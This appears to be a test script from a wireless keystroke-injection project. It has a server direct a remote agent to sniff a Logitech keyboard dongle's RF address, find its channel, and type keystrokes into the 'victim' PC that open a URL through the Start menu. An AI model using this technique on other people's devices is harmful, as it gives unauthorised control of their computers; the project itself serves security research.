'''
Testing Client-Server communication. The server sends live commands over the network to a possibly remote agent computer,
in order to inject 123456789 to a victim. This way, only the agent is required to be physically close to the victim,
and it directly operates the USB attacking dongle based on the server's commands.
'''

import time
import sys
from os.path import dirname

sys.path.append(dirname(dirname(__file__)))
from main_app.radio_server import * # now the server is imported rather than the agent
from utils.general_utils import *

def main():
    address = [0xB4, 0xB8, 0xAE, 0xED, 0xE4] # RF address of a Logitech MK345 keyboard that I (Ron) own

    # initialize the radio server
    radio_server = RadioServer("0.0.0.0", 5000) # 0.0.0.0 means listen on all network interfaces, this way we don't need to change the IP in this line every time we run the server on a different computer

    radio_server.enter_sniffer_mode(address)
    channel = find_frequency_channel(radio_server)
    if not channel:
        print("Failed to find frequency channel. Tell the agent to try getting closer to the victim dongle.")
        sys.exit(1)

    # transmit_string(radio_server, "1123456789")

    # using the search bar of the start menu to open the browser on some URL
    transmit_keys(radio_server, ['WINDOWS']) # open the start menu
    transmit_string(radio_server, 'www.github.com/avivk9/Mousploit')
    time.sleep(0.75) # otherwise the Enter keystroke will not be effective, because it takes a moment for the start menu to refresh
    transmit_keys(radio_server, ['ENTER'])

if __name__ == "__main__":
    main()
